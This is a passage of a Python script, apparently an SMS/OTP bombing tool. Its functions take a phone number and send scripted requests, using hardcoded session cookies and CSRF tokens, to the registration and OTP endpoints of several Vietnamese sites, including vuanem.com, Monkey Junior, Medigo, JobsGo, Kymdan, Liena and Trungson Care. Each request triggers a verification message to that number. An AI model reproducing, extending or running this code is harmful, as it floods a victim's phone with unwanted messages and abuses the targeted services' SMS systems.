        "XSRF-TOKEN": "eyJpdiI6IkZFYkF4Z3l4MHZNRXlkc2syZVJwQXc9PSIsInZhbHVlIjoiMmpFR1AySzE3MFJ0cEhqS1FEVE5hVEZ3bEdjbnlIU3JUdE1jaHdNb0hLSDdkdzM5Mkw3YnQ2b3dSUDVUVGxiaitpL1NLanA1c3dOZTVDcW1mTVZEcHNqVDNXTTQrcDFLcVlMeEErSHNWdm83dkpFTnZxcWcvSVdBYnJVamZZaFIiLCJtYWMiOiI0MzFiOWU1YjY5OGI2Y2M1Y2EzNTg1Y2QxYzYwZDdlMTZmMzUyMzY4YmYzZDhiY2MxYjVkYzAzOTUyNTcxNGQwIiwidGFnIjoiIn0%3D",
        "vuanem_session": "eyJpdiI6Ik9wUGZLSjVaSzlrWWxFdC9NdTczamc9PSIsInZhbHVlIjoibHhQbDhZQnRZdmlYcnFCejRaa0hCdTNrcXBXcHVKWVFkVURvbnkwRnhDMzlMM2Q5dUs3b2lwWGxvZjl5VmVPZVl1QzdGaWJSSitrb0Z0dmJxcjVXRy9UNkZEcHJpM3dCMDNkbnBEaVA0NTk0UVZjYTFueFJvMUdVOHovOFJCZ0EiLCJtYWMiOiJiMzAwMmNiMWI4YzJhZjFkZGIzNzQzMDBmYzYwMzQ2NWU0MzA3ZDU0NDZkMzg5NTVhNWYzZjlhOWM3OTI1ZjhiIiwidGFnIjoiIn0%3D",
        "HARD_ASK_STATUS": "%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D",
    }
    headers = {
        "accept": "text/html, application/xhtml+xml",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        # 'cookie': '_gcl_au=1.1.1128585024.1735574039; _ga=GA1.1.250368982.1735574040; _omappvp=VK1C6VoloRGZ6HXZ1TmqGaGfrlN1xwbsBbkTkpA3MibQWKzp1w9J3xjV537SsIPtBlHN8OIlwiMAim1aeS1gpLFa3ZTVXpaC; _tt_enable_cookie=1; _ttp=FOAk7BHWqv3mT4nj9RVG0guczge.tt.1; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2223c1d9a0-c444-498a-b273-de8f2f5d5674%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; omSeen-yb0ikgooj8bthm1nt9fg=1735574243012; OPT_IN_SHOWN_TIME=1735888837087; _ga_DRHBMGWWEV=GS1.1.1736348543.4.0.1736348543.60.0.977217226; _uetsid=919ed260cdd111ef9f0a4dbdae8f09e4; _uetvid=48c62b60c6c611ef99b8e5eb91fdf162; _clck=1olqljb%7C2%7Cfse%7C0%7C1825; omSeen-xq4g8vc9ua0nvty8bmdi=1736348546259; _clsk=17fwkno%7C1736348547417%7C1%7C1%7Ce.clarity.ms%2Fcollect; moe_uuid=23c1d9a0-c444-498a-b273-de8f2f5d5674; SESSION=%7B%22sessionKey%22%3A%2237bd3d0b-93ba-4a12-9258-1f826cb4916e%22%2C%22sessionStartTime%22%3A%222025-01-08T15%3A02%3A28.910Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1736350348956%2C%22numberOfSessions%22%3A8%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fvuanem.com%2F%3Futm_source%3Dcoccoc%26utm_medium%3Dcpc%26utm_campaign%3D1830508%26utm_term%3Dvuanem%26utm_content%3D44894959%26ctm_event_id%3D3239749836%22%2C%22source%22%3A%22coccoc%22%2C%22medium%22%3A%22cpc%22%2C%22term%22%3A%22vuanem%22%2C%22campaign_name%22%3A%221830508%22%2C%22content%22%3A%2244894959%22%7D%7D; om-xq4g8vc9ua0nvty8bmdi=1736348549226; XSRF-TOKEN=eyJpdiI6IkZFYkF4Z3l4MHZNRXlkc2syZVJwQXc9PSIsInZhbHVlIjoiMmpFR1AySzE3MFJ0cEhqS1FEVE5hVEZ3bEdjbnlIU3JUdE1jaHdNb0hLSDdkdzM5Mkw3YnQ2b3dSUDVUVGxiaitpL1NLanA1c3dOZTVDcW1mTVZEcHNqVDNXTTQrcDFLcVlMeEErSHNWdm83dkpFTnZxcWcvSVdBYnJVamZZaFIiLCJtYWMiOiI0MzFiOWU1YjY5OGI2Y2M1Y2EzNTg1Y2QxYzYwZDdlMTZmMzUyMzY4YmYzZDhiY2MxYjVkYzAzOTUyNTcxNGQwIiwidGFnIjoiIn0%3D; vuanem_session=eyJpdiI6Ik9wUGZLSjVaSzlrWWxFdC9NdTczamc9PSIsInZhbHVlIjoibHhQbDhZQnRZdmlYcnFCejRaa0hCdTNrcXBXcHVKWVFkVURvbnkwRnhDMzlMM2Q5dUs3b2lwWGxvZjl5VmVPZVl1QzdGaWJSSitrb0Z0dmJxcjVXRy9UNkZEcHJpM3dCMDNkbnBEaVA0NTk0UVZjYTFueFJvMUdVOHovOFJCZ0EiLCJtYWMiOiJiMzAwMmNiMWI4YzJhZjFkZGIzNzQzMDBmYzYwMzQ2NWU0MzA3ZDU0NDZkMzg5NTVhNWYzZjlhOWM3OTI1ZjhiIiwidGFnIjoiIn0%3D; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        "origin": "https://vuanem.com",
        "priority": "u=1, i",
        "referer": "https://vuanem.com/?utm_source=coccoc&utm_medium=cpc&utm_campaign=1830508&utm_term=vuanem&utm_content=44894959&ctm_event_id=3239749836",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-csrf-token": "cNOvRERpY1g3uQaQWvQET2eFz1H6wm97X9FoFVMG",
        "x-livewire": "true",
    }
    json_data = {
        "fingerprint": {
            "id": "9UZ0Bc4g6cAYjnBraW2E",
            "name": "customer.login-form",
            "locale": "en",
            "path": "/",
            "method": "GET",
            "v": "acj",
        },
        "serverMemo": {
            "children": [],
            "errors": [],
            "htmlHash": "d3e89efb",
            "data": {
                "phone": phone,
                "email": "",
                "login_by_email": "",
                "method_name": "",
                "isMethodOtpFormScreen": True,
                "isInputOtpFormScreen": False,
                "isResetOtp": False,
                "otps": [
                    "",
                    "",
                    "",
                    "",
                ],
                "otp": None,
                "bannerLoginWeb": {
                    "id": 54,
                    "created": "2024-10-13 16:32:34",
                    "modified": "2024-10-13 16:32:34",
                    "guid": "eb1c44e8-695e-441f-a7f6-8ff2fb47e47c",
                    "tieude": "Login banner",
                    "linklienket": "https://vuanem.com/",
                    "id_vitrihienthi": 15,
                    "idfilebanner": 219,
                    "ismobile": 1,
                    "thutu": 1,
                    "isweb": 1,
                    "mota": "",
                    "trangthai": 1,
                    "urlhienthi": "https://vuanem.com/",
                    "end_date": None,
                    "start_date": None,
                    "file": {
                        "id": 219,
                        "guid": "53ec9631-9288-4a74-80dd-e1730f8737cb",
                    },
                    "banner_image_url": "https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb",
                },
                "bannerLoginMobile": {
                    "id": 54,
                    "created": "2024-10-13 16:32:34",
                    "modified": "2024-10-13 16:32:34",
                    "guid": "eb1c44e8-695e-441f-a7f6-8ff2fb47e47c",
                    "tieude": "Login banner",
                    "linklienket": "https://vuanem.com/",
                    "id_vitrihienthi": 15,
                    "idfilebanner": 219,
                    "ismobile": 1,
                    "thutu": 1,
                    "isweb": 1,
                    "mota": "",
                    "trangthai": 1,
                    "urlhienthi": "https://vuanem.com/",
                    "end_date": None,
                    "start_date": None,
                    "file": {
                        "id": 219,
                        "guid": "53ec9631-9288-4a74-80dd-e1730f8737cb",
                    },
                    "banner_image_url": "https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb",
                },
                "isVoucherLogin": False,
                "isVoucherCheckoutLogin": False,
                "isInputPhoneScreen": False,
                "isShowNoticeVoucherScreen": True,
                "userAgent": "",
                "userActions": "",
                "currentUrl": "",
                "urlRedirect": "",
            },
            "dataMeta": [],
            "checksum": "abbd343083301110a157fda505c7ebc94f2b20945dda7e10e98fd12bd2d3fbd2",
        },
        "updates": [
            {
                "type": "callMethod",
                "payload": {
                    "id": "wwyn",
                    "method": "processMethodOtp",
                    "params": [
                        "sms",
                    ],
                },
            },
        ],
    }
    response = requests.post(
        "https://vuanem.com/livewire/message/customer.login-form",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def vuanem1(phone):
    cookies = {
        "_gcl_au": "1.1.1128585024.1735574039",
        "_ga": "GA1.1.250368982.1735574040",
        "_omappvp": "VK1C6VoloRGZ6HXZ1TmqGaGfrlN1xwbsBbkTkpA3MibQWKzp1w9J3xjV537SsIPtBlHN8OIlwiMAim1aeS1gpLFa3ZTVXpaC",
        "_tt_enable_cookie": "1",
        "_ttp": "FOAk7BHWqv3mT4nj9RVG0guczge.tt.1",
        "USER_DATA": "%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2223c1d9a0-c444-498a-b273-de8f2f5d5674%22%2C%22deviceAdded%22%3Atrue%7D",
        "SOFT_ASK_STATUS": "%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D",
        "omSeen-yb0ikgooj8bthm1nt9fg": "1735574243012",
        "OPT_IN_SHOWN_TIME": "1735888837087",
        "_ga_DRHBMGWWEV": "GS1.1.1736348543.4.0.1736348543.60.0.977217226",
        "_uetsid": "919ed260cdd111ef9f0a4dbdae8f09e4",
        "_uetvid": "48c62b60c6c611ef99b8e5eb91fdf162",
        "_clck": "1olqljb%7C2%7Cfse%7C0%7C1825",
        "omSeen-xq4g8vc9ua0nvty8bmdi": "1736348546259",
        "moe_uuid": "23c1d9a0-c444-498a-b273-de8f2f5d5674",
        "SESSION": "%7B%22sessionKey%22%3A%2237bd3d0b-93ba-4a12-9258-1f826cb4916e%22%2C%22sessionStartTime%22%3A%222025-01-08T15%3A02%3A28.910Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1736350348956%2C%22numberOfSessions%22%3A8%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fvuanem.com%2F%3Futm_source%3Dcoccoc%26utm_medium%3Dcpc%26utm_campaign%3D1830508%26utm_term%3Dvuanem%26utm_content%3D44894959%26ctm_event_id%3D3239749836%22%2C%22source%22%3A%22coccoc%22%2C%22medium%22%3A%22cpc%22%2C%22term%22%3A%22vuanem%22%2C%22campaign_name%22%3A%221830508%22%2C%22content%22%3A%2244894959%22%7D%7D",
        "om-xq4g8vc9ua0nvty8bmdi": "1736348549226",
        "HARD_ASK_STATUS": "%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D",
        "_clsk": "17fwkno%7C1736348680961%7C2%7C1%7Ce.clarity.ms%2Fcollect",
        "XSRF-TOKEN": "eyJpdiI6IlplaVU4RWdKR1EzMHMzcDBEYXMrRWc9PSIsInZhbHVlIjoiVHZMZXJoUGN6RXZQVnI0aHpiQ2VFYW8rTkFiWlAvR0xsejFCRVNwYTY1bHRZbFlSNHVhTGsyeUVtTFVWR29FTU5ZejJSRXFGcnd3emtTaWxpRHdDdFhmNisvdnIwSFpubmZvOXFNdmZkR3FkdVFPTkpVNTVJMTYxbFpFOGFCMVUiLCJtYWMiOiIzZjY2MmQ0YjJiNzYyOGQzZmJkY2JlZGU5M2E2NDQ5OTVmYWMxYjI2ODhlYWZiOGMzZjI1OTAxY2I5NDAwN2UzIiwidGFnIjoiIn0%3D",
        "vuanem_session": "eyJpdiI6ImFNeGhJV2EvNjhHMGJ1WVdSSEJRNVE9PSIsInZhbHVlIjoibDV1aGVoSjcxNTNPN2dKTEhwbFhTNTdkMjZ3SWlBaXhlbEp2TndoaE1IL3lmTGE0dHFTVXFBQXlFWWdKbkpMVFZwM05JbFRUTDVyWThBS3o4K29MSmw4MlgrTUNGRS80dEdOQVNQSi9lc0UzYWdTNWh1cG5iVW1ZSlV1aHFLZnciLCJtYWMiOiIzN2VkOGNmZmI5MDY5MzUwNjg2MzRkZWE2NmI3YmM3MmJiZGY5ZmIzYjQ3MTEzNTllZTk2MzZjOWYxYmIxZjM2IiwidGFnIjoiIn0%3D",
    }
    headers = {
        "accept": "text/html, application/xhtml+xml",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        "origin": "https://vuanem.com",
        "priority": "u=1, i",
        "referer": "https://vuanem.com/?utm_source=coccoc&utm_medium=cpc&utm_campaign=1830508&utm_term=vuanem&utm_content=44894959&ctm_event_id=3239749836",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-csrf-token": "cNOvRERpY1g3uQaQWvQET2eFz1H6wm97X9FoFVMG",
        "x-livewire": "true",
    }
    json_data = {
        "fingerprint": {
            "id": "9UZ0Bc4g6cAYjnBraW2E",
            "name": "customer.login-form",
            "locale": "en",
            "path": "/",
            "method": "GET",
            "v": "acj",
        },
        "serverMemo": {
            "children": [],
            "errors": [],
            "htmlHash": "9f3d17c2",
            "data": {
                "phone": phone,
                "email": "",
                "login_by_email": "",
                "method_name": "zalo",
                "isMethodOtpFormScreen": False,
                "isInputOtpFormScreen": True,
                "isResetOtp": True,
                "otps": [
                    "",
                    "",
                    "",
                    "",
                ],
                "otp": None,
                "bannerLoginWeb": {
                    "id": 54,
                    "created": "2024-10-13 16:32:34",
                    "modified": "2024-10-13 16:32:34",
                    "guid": "eb1c44e8-695e-441f-a7f6-8ff2fb47e47c",
                    "tieude": "Login banner",
                    "linklienket": "https://vuanem.com/",
                    "id_vitrihienthi": 15,
                    "idfilebanner": 219,
                    "ismobile": 1,
                    "thutu": 1,
                    "isweb": 1,
                    "mota": "",
                    "trangthai": 1,
                    "urlhienthi": "https://vuanem.com/",
                    "end_date": None,
                    "start_date": None,
                    "file": {
                        "id": 219,
                        "guid": "53ec9631-9288-4a74-80dd-e1730f8737cb",
                    },
                    "banner_image_url": "https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb",
                },
                "bannerLoginMobile": {
                    "id": 54,
                    "created": "2024-10-13 16:32:34",
                    "modified": "2024-10-13 16:32:34",
                    "guid": "eb1c44e8-695e-441f-a7f6-8ff2fb47e47c",
                    "tieude": "Login banner",
                    "linklienket": "https://vuanem.com/",
                    "id_vitrihienthi": 15,
                    "idfilebanner": 219,
                    "ismobile": 1,
                    "thutu": 1,
                    "isweb": 1,
                    "mota": "",
                    "trangthai": 1,
                    "urlhienthi": "https://vuanem.com/",
                    "end_date": None,
                    "start_date": None,
                    "file": {
                        "id": 219,
                        "guid": "53ec9631-9288-4a74-80dd-e1730f8737cb",
                    },
                    "banner_image_url": "https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb",
                },
                "isVoucherLogin": False,
                "isVoucherCheckoutLogin": False,
                "isInputPhoneScreen": False,
                "isShowNoticeVoucherScreen": True,
                "userAgent": "",
                "userActions": "",
                "currentUrl": "",
                "urlRedirect": "",
            },
            "dataMeta": [],
            "checksum": "aaad02cd31f69b146a02a2df7b4bf99feec02f8a89e0ea3f28e7068370b87b6c",
        },
        "updates": [
            {
                "type": "fireEvent",
                "payload": {
                    "id": "e88w",
                    "event": "resetOtp",
                    "params": [],
                },
            },
        ],
    }
    response = requests.post(
        "https://vuanem.com/livewire/message/customer.login-form",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def monkeyjunior(phone):  # ap; nhieu ap phet
    headers = {
        "Host": "app.monkeyenglish.net",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": "MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    params = {
        "lang": "vi-VN",
    }
    json_data = {
        "app_id": 2,
        "device_id": "104547954",
        "os": "ios",
        "info": "Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2",
        "subversion": "42.0.84",
        "device_type": 2,
        "is_test": False,
        "os_name": "iOS",
        "type": 3,
        "phone": phone[1:10],
        "password": "123123aa@",
        "country_code": "+84",
        "is_upgrade": False,
    }
    response = requests.post(
        "https://app.monkeyenglish.net/app/api/v2/account/authen/register",
        params=params,
        headers=headers,
        json=json_data,
    )
    headers = {
        "Host": "app.monkeyenglish.net",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": "MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    params = {
        "lang": "vi-VN",
    }
    json_data = {
        "app_id": 2,
        "device_id": "104547954",
        "os": "ios",
        "info": "Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2",
        "subversion": "42.0.84",
        "device_type": 2,
        "is_test": False,
        "os_name": "iOS",
        "type": 1,
        "country_code": "+84",
        "phone": phone[1:10],
        "email": "",
    }
    response = requests.post(
        "https://app.monkeyenglish.net/app/api/v1/account/send-opt-verify-pw",
        params=params,
        headers=headers,
        json=json_data,
    )
def medigozl(phone):
    headers = {
        "authority": "auth.medigoapp.com",
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://www.medigoapp.com",
        "referer": "https://www.medigoapp.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    }
    params = {
        "from": "ZALO",
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "https://auth.medigoapp.com/prod/getOtp",
        params=params,
        headers=headers,
        json=json_data,
    )
def jobsgo(phone):
    cookies = {
        "jobsgo-candidate-redis": "7djmhnao5ogdh7a52v4h6o2mss",
        "ref": "cc2ef9e9706ab2b4e17c88d542a5c77dc803f72261735ea0984dc8225bd9e97ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ref%22%3Bi%3A1%3Bs%3A26%3A%22https%253A%252F%252Fjobsgo.vn%252F%22%3B%7D",
        "_csrf-jobsgo-candidate": "a6d251d1e0179e735226db05fa210a434ee2a24d9456733e36279fdd49295b5ea%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22_csrf-jobsgo-candidate%22%3Bi%3A1%3Bs%3A32%3A%22Gx-_ODO2Wpynvr8CJZ4lBk6CggNwPBnW%22%3B%7D",
        "_ga": "GA1.1.57842391.1737282681",
        "_gcl_au": "1.1.1298459596.1737282681",
        "jobsgo_app_popup": "true",
        "_ga_EHD5KK9TRQ": "GS1.1.1737282680.1.1.1737282683.57.0.0",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'Cookie': 'jobsgo-candidate-redis=7djmhnao5ogdh7a52v4h6o2mss; ref=cc2ef9e9706ab2b4e17c88d542a5c77dc803f72261735ea0984dc8225bd9e97ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ref%22%3Bi%3A1%3Bs%3A26%3A%22https%253A%252F%252Fjobsgo.vn%252F%22%3B%7D; _csrf-jobsgo-candidate=a6d251d1e0179e735226db05fa210a434ee2a24d9456733e36279fdd49295b5ea%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22_csrf-jobsgo-candidate%22%3Bi%3A1%3Bs%3A32%3A%22Gx-_ODO2Wpynvr8CJZ4lBk6CggNwPBnW%22%3B%7D; _ga=GA1.1.57842391.1737282681; _gcl_au=1.1.1298459596.1737282681; jobsgo_app_popup=true; _ga_EHD5KK9TRQ=GS1.1.1737282680.1.1.1737282683.57.0.0',
        "Origin": "https://jobsgo.vn",
        "Referer": "https://jobsgo.vn/site/register?ref=https%253A%252F%252Fjobsgo.vn%252F",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "X-CSRF-Token": "0uXekskU5FtY1qvKvDACmRhB5d550nkytYBlyIg_Yh-VnfPNhlCraQ-m0qTKQjraUhvRsju5T3HS5yu_2H0MSA==",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }
    data = {
        "phone": phone,
    }
    response = requests.post(
        "https://jobsgo.vn/site/verify-zalo",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def kymdan(phone):
    headers = {
        "sec-ch-ua-platform": '"Windows"',
        "x-screen": "DESKTOP",
        "Referer": "https://kymdanshop.vn/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "Access-Control-Allow-Credentials": "true",
        "x-language": "vn",
        "x-device": "DESKTOP",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    json_data = {
        "last_name": "lý",
        "first_name": "an",
        "phone_number_signup": phone,
        "email_signup": "lklkklk@gmail.com",
        "password_signup": "123321",
    }
    response = requests.post(
        "https://api.kymdanstore.vn/apis/v1/user/register/",
        headers=headers,
        json=json_data,
    )
def liena(phone):
    cookies = {
        "_gcl_au": "1.1.632390051.1735136571",
        "PHPSESSID": "10bcc507b902cc2e22a6647cee2c54f2",
        "form_key": "VECzf7U9YsGnjLhv",
        "mage-cache-storage": "{}",
        "mage-cache-storage-section-invalidation": "{}",
        "mage-cache-sessid": "true",
        "recently_viewed_product": "{}",
        "recently_viewed_product_previous": "{}",
        "recently_compared_product": "{}",
        "recently_compared_product_previous": "{}",
        "product_data_storage": "{}",
        "mage-messages": "",
        "_gid": "GA1.3.1438732137.1737350955",
        "_ga_EG96D1Q288": "GS1.1.1737350954.7.1.1737350972.42.0.0",
        "_ga": "GA1.3.99280258.1735136571",
        "form_key": "VECzf7U9YsGnjLhv",
        "section_data_ids": "{}",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        # 'cookie': '_gcl_au=1.1.632390051.1735136571; PHPSESSID=10bcc507b902cc2e22a6647cee2c54f2; form_key=VECzf7U9YsGnjLhv; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; _gid=GA1.3.1438732137.1737350955; _ga_EG96D1Q288=GS1.1.1737350954.7.1.1737350972.42.0.0; _ga=GA1.3.99280258.1735136571; form_key=VECzf7U9YsGnjLhv; section_data_ids={}',
        "origin": "https://www.liena.com.vn",
        "priority": "u=1, i",
        "referer": "https://www.liena.com.vn/la-customer/register",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    json_data = {
        "phone_number": phone,
    }
    response = requests.post(
        "https://www.liena.com.vn/rest/V1/liena/customer/registration/request",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def trungson(phone):
    cookies = {
        "sid_customer_s_558c5": "cce95f3cd603cce60b9af7f10668ddda-1-C",
        "_gcl_au": "1.1.231307612.1734712657",
        "_ga": "GA1.1.1766751374.1734712657",
        "klaro": "%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D",
        "popAppNewLogin": "0",
        "_clck": "c6nec1%7C2%7Cfs5%7C0%7C1815",
        "checkacc": "0",
        "_ga_PYTSCXQW2F": "GS1.1.1735558954.4.1.1735559222.51.0.1745539696",
        "_clsk": "1plivqm%7C1735559223667%7C3%7C1%7Ce.clarity.ms%2Fcollect",
        "_ga_63MSVPCDN5": "GS1.1.1735558954.4.1.1735559235.38.0.397851942",
        "_ga_BHEHR1EHZQ": "GS1.1.1735558953.4.1.1735559235.38.0.1014577330",
    }
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'Cookie': 'sid_customer_s_558c5=cce95f3cd603cce60b9af7f10668ddda-1-C; _gcl_au=1.1.231307612.1734712657; _ga=GA1.1.1766751374.1734712657; klaro=%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D; popAppNewLogin=0; _clck=c6nec1%7C2%7Cfs5%7C0%7C1815; checkacc=0; _ga_PYTSCXQW2F=GS1.1.1735558954.4.1.1735559222.51.0.1745539696; _clsk=1plivqm%7C1735559223667%7C3%7C1%7Ce.clarity.ms%2Fcollect; _ga_63MSVPCDN5=GS1.1.1735558954.4.1.1735559235.38.0.397851942; _ga_BHEHR1EHZQ=GS1.1.1735558953.4.1.1735559235.38.0.1014577330',
        "Origin": "https://trungsoncare.com",
        "Referer": "https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dprofiles.update",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    params = {
        "dispatch": "loginbyOTP",
    }
    data = {
        "func": "getotp",
        "user_type": "zalo",
        "read_policy": "1",
        "ip_code": "84",
        "user_login": phone,
        "security_hash": "45ed21c7f436d16c88d9e34145b19665",
    }
    response = requests.post(
        "https://trungsoncare.com/index.php",
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
def trungson1(phone):
    cookies = {
        "sid_customer_s_558c5": "cce95f3cd603cce60b9af7f10668ddda-1-C",
        "_gcl_au": "1.1.231307612.1734712657",
        "_ga": "GA1.1.1766751374.1734712657",
        "klaro": "%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D",
        "popAppNewLogin": "0",
        "_clck": "c6nec1%7C2%7Cfs5%7C0%7C1815",
        "checkacc": "0",
        "_ga_PYTSCXQW2F": "GS1.1.1735558954.4.1.1735559494.7.0.1745539696",
        "_clsk": "1plivqm%7C1735559496193%7C5%7C1%7Ce.clarity.ms%2Fcollect",
        "_ga_63MSVPCDN5": "GS1.1.1735558954.4.1.1735559513.60.0.397851942",
        "_ga_BHEHR1EHZQ": "GS1.1.1735558953.4.1.1735559513.60.0.1014577330",
    }
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
